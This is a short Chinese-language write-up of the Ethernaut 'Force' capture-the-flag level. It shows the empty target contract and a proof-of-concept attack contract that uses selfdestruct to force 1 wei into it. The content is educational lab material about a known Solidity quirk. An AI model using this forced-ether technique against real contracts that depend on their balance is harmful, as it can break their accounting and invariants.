#   Level 7 Force
實例地址：`0x24e0B4ECD1598C5c34af3f54a27f952f95642055`

##  題目說明
有些合約就是不想要收你的錢錢 ¯\_(ツ)_/¯

這一關的目標是使合約的餘額大於 0

  可能會有用的資訊

*   fallback 方法
*   有時候攻擊一個合約最好的方法是使用另一個合約
*   閱讀上方的幫助頁面 "Beyond the console" 章節

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

##  POC
該合約沒有 `fallback`、`receive` 可以直接轉錢進去，我們可以寫一個攻擊合約，並存入 1 wei，最後觸發 `selfdestruct` 自毀合約，將錢強行匯入。

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attack{
    address payable public target;

    constructor(address payable _target) payable{
        target = _target;
    }

    function attack() public{
        selfdestruct(target);
    }
}
```